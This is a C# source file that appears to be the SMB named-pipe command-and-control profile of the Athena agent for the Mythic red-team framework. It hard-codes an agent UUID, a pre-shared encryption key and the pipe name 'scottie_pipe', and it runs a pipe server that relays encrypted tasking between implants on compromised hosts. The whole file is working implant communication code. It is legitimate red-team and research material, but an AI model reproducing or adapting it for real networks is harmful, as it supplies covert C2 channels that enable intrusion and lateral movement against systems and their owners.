﻿using Athena.Models.Mythic.Response;
using Athena.Utilities;
using Newtonsoft.Json;
using System;
using System.Collections.Concurrent;
using System.Threading.Tasks;
using H.Pipes;
using H.Pipes.Args;
using System.Threading;

namespace Athena.Config
{
    public class MythicConfig
    {
        public Smb currentConfig { get; set; }
        public string uuid { get; set; }
        public DateTime killDate { get; set; }
        public int sleep { get; set; }
        public int jitter { get; set; }
        public Forwarder forwarder { get; set; }

        public MythicConfig()
        {
            this.uuid = "ee3a92e5-8af2-47f2-b16a-980eb695c2b8";
            DateTime kd = DateTime.TryParse("killdate", out kd) ? kd : DateTime.MaxValue;
            this.killDate = kd;
            int sleep = 1; //A 0 sleep causes issues with messaging, so setting it to 1 to help mitigate those issues
            this.sleep = sleep;
            int jitter = 0;
            this.jitter = jitter;
            this.currentConfig = new Smb(this.uuid, this);
            this.forwarder = new Forwarder();
        }
    }

    public class Smb
    {
        public string psk { get; set; }
        private PipeServer<string> serverPipe { get; set; }
        public string pipeName = "scottie_pipe";
        private bool connected { get; set; }
        public bool encrypted { get; set; }
        public bool encryptedExchangeCheck = bool.Parse("false");
        public PSKCrypto crypt { get; set; }
        public BlockingCollection<DelegateMessage> queueIn { get; set; }
        private ManualResetEvent onEventHappenedSignal = new ManualResetEvent(false);
        private ManualResetEvent onClientConnectedSignal = new ManualResetEvent(false);

        public Smb(string uuid, MythicConfig config)
        {
            this.connected = false;
            this.psk = "4l+ij/uHKPgetjzXSP3egHEbsFDpW6frDgZPaUUu7rE=";
            this.queueIn = new BlockingCollection<DelegateMessage>();
            if (!string.IsNullOrEmpty(this.psk))
            {
                this.crypt = new PSKCrypto(uuid, this.psk);
                this.encrypted = true;
            }
            this.serverPipe = new PipeServer<string>(this.pipeName);
            this.serverPipe.ClientConnected += async (o, args) => await OnClientConnection();
            this.serverPipe.ClientDisconnected += async (o, args) => await OnClientDisconnect();
            this.serverPipe.MessageReceived += (sender, args) => OnMessageReceive(args);
            this.serverPipe.StartAsync();
        }

        private async void OnMessageReceive(ConnectionMessageEventArgs<string> args)
        {
            try
            {
                //Add message to out queue.
                DelegateMessage dm = JsonConvert.DeserializeObject<DelegateMessage>(args.Message);
                this.queueIn.Add(dm);
            }
            catch
            {
                DelegateMessage dm = new DelegateMessage()
                {
                    c2_profile = "smb",
                    uuid = "",
                    message = ""
                };
            }
            onEventHappenedSignal.Set(); //Indicate something happened
        }

        public async Task OnClientConnection()
        {
            onClientConnectedSignal.Set();
            this.connected = true;
        }

        public async Task OnClientDisconnect()
        {
            this.connected = false;
            onEventHappenedSignal.Set(); //Indicate something happened
            onClientConnectedSignal.Reset();
        }

        //Send, wait for a response, and return it to the main functions
        public async Task<string> Send(object obj)
        {
            if (!connected)
            {
                onClientConnectedSignal.WaitOne();
            }

            try
            {
                string json = JsonConvert.SerializeObject(obj);
                if (this.encrypted)
                {
                    json = this.crypt.Encrypt(json);
                }
                else
                {
                    json = Misc.Base64Encode(Globals.mc.MythicConfig.uuid + json);
                }

                //Submit our message to the mythic server and wait for a response
                DelegateMessage dm = new DelegateMessage()
                {
                    uuid = Globals.mc.MythicConfig.uuid,
                    message = json,
                    c2_profile = "smb"
                };

                await this.serverPipe.WriteAsync(JsonConvert.SerializeObject(dm)); //Write our output

                //Wait for a signal

                onEventHappenedSignal.WaitOne();

                if (!connected) //Our event was a client disconnect
                {
                    onEventHappenedSignal.Reset(); //Reset the event and return empty
                    return "";
                }
                else //Our event was a new message
                {
                    if (this.queueIn.Count > 0) //Check if we actually got a message
                    {
                        dm = this.queueIn.Take(); //Take a value from it

                        onEventHappenedSignal.Reset(); //Reset the event and return

                        if (this.encrypted) //Return dm
                        {
                            return this.crypt.Decrypt(dm.message);
                        }
                        else
                        {
                            return Misc.Base64Decode(dm.message).Substring(36);
                        }
                    }
                    else
                    {
                        return "";
                    }
                }
            }
            catch
            {
                this.connected = false;
                return "";
            }
        }
    }
}
